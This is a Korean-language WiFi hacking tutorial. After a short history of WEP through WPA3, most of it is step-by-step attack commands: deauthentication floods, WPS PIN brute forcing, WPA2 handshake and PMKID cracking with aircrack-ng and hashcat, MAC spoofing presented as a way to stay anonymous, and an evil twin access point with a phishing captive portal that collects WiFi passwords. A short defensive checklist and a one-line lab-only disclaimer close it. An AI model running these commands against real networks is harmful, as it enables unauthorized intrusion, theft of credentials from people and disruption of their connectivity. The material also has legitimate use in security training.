# WiFi 해킹 기초 이론

## 무선 네트워크 구조

```
WiFi 프레임 유형
───────────────────────────────
Management Frames (관리 프레임)
  - Beacon: AP가 자신을 알리는 브로드캐스트
  - Probe Request: 클라이언트가 AP 탐색
  - Probe Response: AP의 응답
  - Authentication: 인증 교환
  - Association Request/Response: 연결 요청/응답
  - Deauthentication: 강제 연결 해제

Control Frames (제어 프레임)
  - RTS (Request to Send)
  - CTS (Clear to Send)
  - ACK (Acknowledgment)

Data Frames (데이터 프레임)
  - 실제 페이로드 데이터
───────────────────────────────
```

---

## 1. 무선 보안 프로토콜 역사

### WEP (Wired Equivalent Privacy)

```
발표: 1997년, 802.11 표준
상태: 2004년 폐기 (완전히 파훼됨)

취약점:
  - RC4 암호화에 24비트 IV 재사용
  - 동일 키스트림 재사용 → XOR 공격
  - CRC32 무결성 검증 (암호학적으로 취약)

크랙 시간: 5분 이내 (패킷 수집 후)
명령어: aircrack-ng -b BSSID capture.cap
```

### WPA (Wi-Fi Protected Access)

```
발표: 2003년 (WEP 긴급 대체)
암호화: TKIP (RC4 기반, 개선된 IV)

취약점:
  - TKIP 취약점 (Beck-Tews Attack)
  - Michael MIC 공격
  - WPA Enterprise: PEAP 취약점

상태: 2012년 이후 사용 비권장
```

### WPA2 (Wi-Fi Protected Access 2)

```
발표: 2004년
암호화: CCMP/AES (강력한 암호화)
인증: PSK (Personal) 또는 Enterprise (802.1X)

취약점:
  - KRACK (Key Reinstallation Attack, 2017)
  - PMKID Attack (2018, 핸드셰이크 불필요)
  - 약한 비밀번호 딕셔너리 공격
  - WPS PIN 브루트포스

상태: 현재 주류, WPA3로 전환 중
```

### WPA3

```
발표: 2018년
개선:
  - SAE (Simultaneous Authentication of Equals)
    → 드래곤플라이 핸드셰이크
    → 오프라인 딕셔너리 공격 방지
  - Forward Secrecy (과거 트래픽 보호)
  - 192비트 암호화 스위트 (Enterprise)
  - PMF (Protected Management Frames) 의무화

현존 취약점:
  - Dragonblood (SAE 사이드채널, 2019)
  - WPA3 전환 네트워크에서 다운그레이드
```

---

## 2. 무선 네트워크 스캔

### Airmon-ng - 모니터 모드

```bash
# 무선 인터페이스 확인
iwconfig
ip link show

# 모니터 모드 활성화
sudo airmon-ng start wlan0
# → wlan0mon 또는 mon0 인터페이스 생성

# 간섭 프로세스 종료
sudo airmon-ng check kill

# 채널 고정
sudo iwconfig wlan0mon channel 6

# 모니터 모드 비활성화
sudo airmon-ng stop wlan0mon
```

### Airodump-ng - 패킷 캡처

```bash
# 모든 AP 스캔
sudo airodump-ng wlan0mon

# 특정 채널 스캔
sudo airodump-ng --channel 1 wlan0mon

# 특정 BSSID 집중 캡처 (핸드셰이크 수집)
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write capture \
    wlan0mon

# 5GHz 대역 스캔
sudo airodump-ng --band a wlan0mon

# 출력 필드 설명
# BSSID: AP의 MAC 주소
# PWR: 신호 강도 (dBm, 음수가 클수록 약함)
# Beacons: 받은 비콘 프레임 수
# #Data: 수집된 데이터 패킷 수
# CH: 채널
# MB: 최대 속도 (Mbps)
# ENC: 암호화 방식
# ESSID: 네트워크 이름
```

### Kismet - 고급 무선 정찰

```bash
# Kismet 설치 및 실행
sudo apt install kismet
sudo kismet -c wlan0mon

# 웹 인터페이스: http://localhost:2501
# 기본 계정: kismet/kismet

# Kismet 캡처 결과 분석
kismetdb_to_pcap --in wardriving.kismet --out capture.pcap
```

---

## 3. WPA2 핸드셰이크 이해

### 4-Way Handshake 과정

```
클라이언트                           AP
   │                                  │
   │  1. EAPOL-Key (ANonce)           │
   │◄─────────────────────────────────│
   │                                  │
   │  2. EAPOL-Key (SNonce + MIC)     │
   │─────────────────────────────────►│
   │                                  │
   │  3. EAPOL-Key (GTK + MIC)        │
   │◄─────────────────────────────────│
   │                                  │
   │  4. EAPOL-Key (ACK)              │
   │─────────────────────────────────►│

핵심:
  PMK (Pairwise Master Key) = PBKDF2(PSK, SSID)
  PTK = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
  MIC = HMAC-MD5/SHA1(PTK, EAPOL 데이터)

크랙 원리:
  알려진 SSID + 사전 단어로 PMK 계산
  → PTK 계산
  → MIC 검증
  → 일치 시 비밀번호 발견
```

### Deauthentication 공격 (핸드셰이크 강제 수집)

```bash
# 특정 클라이언트에 Deauth 패킷 전송
sudo aireplay-ng \
    --deauth 10 \
    -a AA:BB:CC:DD:EE:FF \  # AP MAC
    -c 11:22:33:44:55:66 \  # 클라이언트 MAC
    wlan0mon

# 모든 클라이언트에 브로드캐스트 Deauth
sudo aireplay-ng \
    --deauth 0 \           # 0=무한
    -a AA:BB:CC:DD:EE:FF \ # AP MAC
    wlan0mon

# Deauth와 동시에 핸드셰이크 캡처 (별도 터미널)
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write handshake \
    wlan0mon

# 캡처 파일에서 핸드셰이크 확인
aircrack-ng handshake-01.cap
```

---

## 4. WPS (Wi-Fi Protected Setup) 취약점

### WPS 핀 브루트포스

```bash
# WPS 활성화된 AP 탐색
sudo wash -i wlan0mon
# Locked: No → 공격 가능

# Reaver로 WPS PIN 크랙
sudo reaver \
    -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -v \
    -c 6 \
    --delay=2           # 잠금 방지 딜레이

# Pixiewps (Pixie Dust Attack) - 빠른 오프라인 공격
sudo reaver \
    -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -K 1 \              # Pixie Dust 활성화
    -v \
    -d 30

# 이론: WPS PIN은 8자리지만 실제로 4+4 두 부분으로 검증
# 총 가능한 경우의 수: 11,000 (10,000 + 1,000)
# 약 4시간이면 모든 PIN 시도 가능
```

---

## 5. Evil Twin (가짜 AP) 공격

### 기본 Evil Twin 설정

```bash
# 1. 합법적 AP 정보 수집
sudo airodump-ng wlan0mon
# SSID, BSSID, Channel, ENC 정보 기록

# 2. 타겟 AP 클라이언트 강제 연결 해제
sudo aireplay-ng --deauth 100 -a BSSID_TARGET wlan0mon

# 3. 동일 SSID의 가짜 AP 생성 (Hostapd)
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
EOF

sudo hostapd /tmp/hostapd.conf &

# 4. DHCP 서버 설정
sudo apt install dnsmasq
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf

# 5. IP 포워딩 및 NAT
sudo ip addr add 192.168.1.1/24 dev wlan1
sudo sysctl net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -j ACCEPT
```

### Captive Portal (인증 페이지) 설정

```bash
# Apache 웹서버 + 피싱 페이지
sudo apt install apache2
cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h2>WiFi 네트워크 재인증</h2>
<form method="POST" action="/capture.php">
  <p>네트워크 비밀번호:</p>
  <input type="password" name="password" placeholder="WiFi 비밀번호">
  <button type="submit">연결</button>
</form>
</body>
</html>
EOF

# DNS 리다이렉션 (모든 쿼리를 가짜 페이지로)
cat >> /tmp/dnsmasq.conf << 'EOF'
address=/#/192.168.1.1
EOF

# iptables로 HTTP 트래픽 리다이렉션
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
    -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
    -j DNAT --to-destination 192.168.1.1:443
```

---

## 6. 무선 도구 빠른 참조

```
airmon-ng    → 모니터 모드 관리
airodump-ng  → 패킷 캡처/AP 스캔
aireplay-ng  → 패킷 주입 (Deauth, ARP replay...)
aircrack-ng  → WEP/WPA 크래킹
airgraph-ng  → 네트워크 그래프 시각화

kismet       → 종합 무선 IDS/센서
wash         → WPS 활성화 AP 스캔
reaver       → WPS PIN 크랙
pixiewps     → Pixie Dust 오프라인 공격
wifite2      → 자동화 WiFi 크래킹
airgeddon    → 올인원 무선 공격 프레임워크
bettercap    → MITM/Evil Twin 자동화
```

---

## 7. 실습 환경 구성

```bash
# 가상 무선 인터페이스 생성 (실습용)
sudo modprobe mac80211_hwsim radios=2

# 생성된 인터페이스 확인
iwconfig

# 무선 어댑터 권장 사항 (실제 공격)
# Alfa AWUS036ACH (AC1200, 2.4/5GHz)
# Alfa AWUS036NHA (300Mbps, 강력한 주입 지원)
# TP-Link TL-WN722N v1 (저렴, 주입 지원)
```

---

## 8. MAC 주소 스푸핑 (익명성 확보)

### MAC 주소 변경 이유와 방법
```bash
# MAC 주소란?
# 네트워크 인터페이스에 하드웨어 수준으로 부여된 고유 식별자
# 패킷이 올바른 장치에 전달될 수 있도록 사용
# 네트워크 로그에 MAC 주소 기록 → 추적 가능

# macchanger로 MAC 주소 변경 (Kali 내장)
sudo ifconfig wlan0 down                  # 인터페이스 비활성화
sudo macchanger --random wlan0            # 랜덤 MAC 설정
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # 특정 MAC으로 변경
sudo ifconfig wlan0 up                    # 인터페이스 재활성화

# 변경 확인
macchanger --show wlan0
# Permanent MAC: 기존 하드웨어 MAC
# Current MAC: 현재 사용 중인 (변경된) MAC

# ip 명령으로 변경 (현대적 방법)
sudo ip link set wlan0 down
sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF
sudo ip link set wlan0 up
```

---

## 9. WPA2 크랙 실전 — 핸드셰이크 수집부터 크랙까지

### 단계별 전체 흐름
```bash
# 1단계: 모니터 모드 활성화 + MAC 변경
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# → wlan0mon 생성

# 2단계: 타겟 AP 스캔
sudo airodump-ng wlan0mon
# BSSID와 CH(채널) 기록

# 3단계: 핸드셰이크 캡처
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon

# 4단계: (다른 터미널) Deauth로 재연결 유도
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# → 클라이언트 재연결 시 핸드셰이크 캡처됨
# → airodump-ng 화면 우상단에 "WPA handshake: AA:BB:CC:DD:EE:FF" 표시

# 5단계: 핸드셰이크 크랙
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# 또는 hashcat으로 GPU 가속 크랙
hcxtools/hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt
```

### PMKID 공격 (클라이언트 없이 크랙 — 2018)
```bash
# 클라이언트가 연결되지 않아도 AP의 PMKID 수집 가능
# hcxdumptool 사용

sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# PMKID 추출
hcxtools/hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# hashcat으로 크랙 (22000 = WPA-PMKID-PBKDF2)
hashcat -a 0 -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d  # 8자리 숫자 브루트포스
```

### 네트워크 보안 강화 권고 (방어 관점)
```
WPA2 / WPA3 보안 강화:
  1. 강력한 비밀번호 설정 (20자 이상, 대소문자+숫자+특수문자)
  2. WPA3 SAE 모드 사용 (Dragonfly 핸드셰이크 — 오프라인 딕셔너리 공격 방지)
  3. WPS 비활성화 (PIN 브루트포스 취약)
  4. PMF (Protected Management Frames) 활성화 — Deauth 공격 방어
  5. 802.1X Enterprise 인증 사용 (기업 환경)
  6. SSID 숨김은 무의미 (Probe Request로 탐지 가능)
  7. MAC 필터링은 MAC 스푸핑으로 우회 가능 → 단독 방어 수단 부적절
```

> **실습 환경에서만 수행하세요.**
> Deauth 공격, Evil Twin은 타인의 네트워크에 수행 시 전파법 위반입니다.
